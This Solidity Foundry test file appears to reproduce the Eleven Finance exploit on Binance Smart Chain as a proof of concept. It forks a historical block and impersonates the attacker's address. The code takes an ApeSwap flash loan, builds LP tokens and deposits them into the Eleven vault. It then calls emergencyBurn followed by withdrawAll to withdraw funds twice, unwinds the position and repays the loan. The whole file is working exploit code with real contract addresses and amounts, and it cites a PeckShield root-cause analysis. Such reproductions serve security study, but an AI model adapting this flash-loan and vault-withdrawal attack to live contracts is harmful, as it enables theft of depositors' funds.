// SPDX-License-Identifier: UNLICENSED
//Credit: Cache_And_Burn

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

/*
Eleven Finance Exploit POC

tx hash: 0x6450d8f4db09972853e948bee44f2cb54b9df786dace774106cd28820e906789

https://peckshield.medium.com/eleven-finance-incident-root-cause-analysis-123b5675fa76
*/

contract Eleven is DSTest {

  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

  IPancakePair cake_LP = IPancakePair(0x401479091d0F7b8AE437Ee8B054575cd33ea72Bd);

  IERC20 nrv = IERC20(0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096);

  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); 

  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

  address public ape_lp = 0x51e6D27FA57373d8d4C256231241053a70Cb1d93;

  IElevenNeverSellVault vault = IElevenNeverSellVault(0x27DD6E51BF715cFc0e2fe96Af26fC9DED89e4BE8);

  //Path from BUSD --> NRV
  address[] path_1 = [
    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,
    0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096
  ];

  //Path from NRV --> BUSD
  address[] path_2 = [
    0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096,
    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
  ];

  function setUp() public {
    // fork bsc block number 8530973
    cheats.createSelectFork("bsc", 8530973); 

    busd.approve(address(router), type(uint256).max);

    busd.approve(ape_lp, type(uint256).max);

    nrv.approve(address(router), type(uint256).max);

    cake_LP.approve(address(vault), type(uint256).max);

    cake_LP.approve(address(router), type(uint256).max);
  }

  function testExploit() public {
    console.log("-------Start exploit-------");

    console.log("attacker BUSD balance before is", busd.balanceOf(address(this)));

    cheats.startPrank(0xc71e2F581b77De945C8A7A191b0B238c81f11eD6);
    
    //Take a flashloan from apeswap
    IPancakePair(ape_lp).swap(
      0, 
      953869628210538003222368, 
      address(this), 
      "Gimme da loot"
    );
  }

  function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external {

    attack();
    
  }

  function attack() public {

    console.log("received BUSD flashloan for", busd.balanceOf(address(this)) / 1 ether );

    //Swap BUSD for NRV
    router.swapExactTokensForTokens(
      340631231201021740166440,
      474378756062092796179091,
      path_1,
      address(this),
      block.timestamp + 500 seconds
    );

    //Add liquidity to pancakeSwap and receive LP tokens
    router.addLiquidity(
      address(nrv),
      address(busd),
      474378756062092796179091,
      366962025372860720681305,
      474378756062092796179091,
      366962025372860720681305,
      address(this),
      block.timestamp + 500 seconds
    );

    //Deposit LP tokens into Eleven vault
    vault.depositAll();

    //Call emergency Burn
    vault.emergencyBurn();

    //withdraw from vault
    vault.withdrawAll();

    //remove liquidity from pancakeSwap
    router.removeLiquidity(
      address(nrv),
      address(busd),
      823030594158097624422918,
      449328228768287545012441,
      347583855261065794904977,
      address(this),
      block.timestamp + 500 seconds
    );

    //swap NRV for BUSD
    router.swapExactTokensForTokens(
      948757512124185592358179,
      624113299151540843640146,
      path_2,
      address(this),
      block.timestamp + 500 seconds
    );

    //repay flashloan
    busd.transfer(ape_lp, 956739847753799401426648);

    console.log("-------Finish exploit-------");

    console.log("attacker BUSD balance after is", busd.balanceOf(address(this)) / 1 ether );
    }
}
